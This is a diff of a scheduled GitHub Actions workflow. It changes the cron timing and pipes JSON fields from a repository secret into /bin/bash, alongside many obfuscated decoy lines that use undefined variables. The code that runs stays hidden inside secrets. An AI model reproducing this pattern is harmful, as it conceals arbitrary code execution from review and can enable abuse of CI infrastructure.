@@ -2,32 +2,24 @@ name: tianbaojizi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 0/6 * * *'
+    - cron: '26 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tianbaojizi
         env:
-          unuz79: ${{ secrets.unuz79 }}
+          h5: ${{ secrets.h5 }}
         run: |
-          echo $unuz79 | jq -r .ost69132 | /bin/bash
-          echo $ck10 | jq -r .r9 | /bin/bash
-          echo $rqie070 | jq -r .nt34 | /bin/bash
-          echo $j64 | jq -r .a093 | /bin/bash
-          echo $vyru234 | jq -r .vwd33132 | /bin/bash
-          echo $vk445 | jq -r .mwzx3 | /bin/bash
-          echo $mezj48 | jq -r .yv35 | /bin/bash
-          echo $nfd1119 | jq -r .ftuz89 | /bin/bash
-          echo $t0 | jq -r .vwlp5917 | /bin/bash
-          echo $hawhx19765 | jq -r .sve28552 | /bin/bash
-          echo $nfxh52945 | jq -r .omcfl7 | /bin/bash
-          echo $t5 | jq -r .ruwa1 | /bin/bash
-          echo $urxw377 | jq -r .bjhtu7521 | /bin/bash
-          echo $ewtm404 | jq -r .ofvzh42594 | /bin/bash
-          echo $ro07348 | jq -r .zyh1574 | /bin/bash
-          echo $whsv6636 | jq -r .e6 | /bin/bash
+          echo $h5 | jq -r .xxu7 | /bin/bash
+          echo $ml2414 | jq -r .qlzo53 | /bin/bash
+          echo $bfbtc934 | jq -r .moeu8548 | /bin/bash
+          echo $mjx778 | jq -r .iyker3 | /bin/bash
+          echo $yx8236 | jq -r .bwkns0690 | /bin/bash
+          echo $ep5434 | jq -r .pss9468 | /bin/bash
+          echo $uwwbf026 | jq -r .brqv56 | /bin/bash
+          echo $pnt00737 | jq -r .kpza3369 | /bin/bash
+          echo $b74 | jq -r .t1264 | /bin/bash
 
